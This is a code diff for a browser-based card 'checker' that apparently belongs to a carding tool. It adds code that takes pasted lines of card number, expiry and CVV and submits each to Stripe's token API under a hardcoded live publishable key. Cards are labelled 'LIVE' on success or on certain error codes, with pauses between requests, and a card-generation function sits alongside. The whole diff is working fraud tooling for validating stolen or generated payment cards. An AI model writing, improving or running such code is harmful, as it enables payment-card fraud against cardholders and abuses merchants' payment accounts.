@@ -653,11 +653,71 @@ function checkCards(){
 const input=document.getElementById('checkerInput').value.trim();
 if(!input){showToast('Paste cards first');return}
 const lines=input.split('\n').filter(l=>l.trim());
-let live=0,die=0;
-let output='<div class="output-cards">';
-lines.forEach(line=>{const parts=line.replace(/\s/g,'').split(/[|,]/);const num=parts[0]||'';const valid=luhnCheck(num)&&num.length>=13&&num.length<=19;if(valid)live++;else die++;output+=`<div class="card-item"><span>${valid?'✅':'❌'} ${line.trim()}</span><span style="color:${valid?'#10b981':'#ef4444'};font-weight:600">${valid?'LIVE':'DIE'}</span></div>`;});
+document.getElementById('checkerResult').innerHTML='<div class="glass-panel"><p>Checking '+lines.length+' cards via Stripe...</p></div>';
+let results=[];let done=0;
+const PK='pk_live_dCyHJcZsk8NaNwx1PiRSpqqq';
+
+function checkOne(idx){
+if(idx>=lines.length){
+// Show results
+let live=results.filter(r=>r.status==='LIVE').length;
+let die=results.filter(r=>r.status==='DIE').length;
+let output=`<div style="display:flex;gap:24px;margin-bottom:16px"><div style="color:#10b981;font-weight:600">✅ Live: ${live}</div><div style="color:#ef4444;font-weight:600">❌ Die: ${die}</div><div style="color:var(--muted)">Total: ${lines.length}</div></div><div class="output-cards">`;
+results.forEach(r=>{output+=`<div class="card-item"><span>${r.status==='LIVE'?'✅':'❌'} ${r.card}</span><span style="color:${r.status==='LIVE'?'#10b981':'#ef4444'};font-weight:600;font-size:12px">${r.status} ${r.msg||''}</span></div>`;});
 output+='</div>';
-document.getElementById('checkerResult').innerHTML=`<div style="display:flex;gap:24px;margin-bottom:16px"><div style="color:#10b981;font-weight:600">✅ Live: ${live}</div><div style="color:#ef4444;font-weight:600">❌ Die: ${die}</div></div>`+output;
+document.getElementById('checkerResult').innerHTML=output;
+return;
+}
+
+const line=lines[idx].trim();
+const parts=line.replace(/\s/g,'').split(/[|,]/);
+const num=parts[0]||'';
+const exp=parts[1]||'';
+const cvv=parts[2]||'';
+const expParts=exp.split('/');
+const month=expParts[0]||'';
+const year=expParts[1]?'20'+expParts[1]:expParts[0]||'';
+
+// Quick Luhn check first
+if(!luhnCheck(num)||num.length<13){
+results.push({card:line,status:'DIE',msg:'Invalid Luhn'});
+document.getElementById('checkerResult').innerHTML=`<div class="glass-panel"><p>Checking... ${idx+1}/${lines.length}</p></div>`;
+setTimeout(()=>checkOne(idx+1),100);
+return;
+}
+
+// Stripe tokenize
+const formData=new URLSearchParams();
+formData.append('card[number]',num);
+formData.append('card[exp_month]',month);
+formData.append('card[exp_year]',year);
+formData.append('card[cvc]',cvv);
+formData.append('key',PK);
+
+fetch('https://api.stripe.com/v1/tokens',{
+method:'POST',
+headers:{'Content-Type':'application/x-www-form-urlencoded'},
+body:formData.toString()
+}).then(r=>r.json()).then(data=>{
+if(data.id){
+results.push({card:line,status:'LIVE',msg:'Approved ✓'});
+}else{
+const msg=data.error?.message||'Declined';
+const code=data.error?.code||'';
+if(code==='incorrect_cvc'||code==='processing_error'){
+results.push({card:line,status:'LIVE',msg:code});
+}else{
+results.push({card:line,status:'DIE',msg:msg.substring(0,30)});
+}
+}
+document.getElementById('checkerResult').innerHTML=`<div class="glass-panel"><p>Checking... ${idx+1}/${lines.length}</p></div>`;
+setTimeout(()=>checkOne(idx+1),1500);
+}).catch(()=>{
+results.push({card:line,status:'DIE',msg:'Network error'});
+setTimeout(()=>checkOne(idx+1),1000);
+});
+}
+checkOne(0);
 }
 function massGenerate(){
 const bin=document.getElementById('massBin').value||'515462';
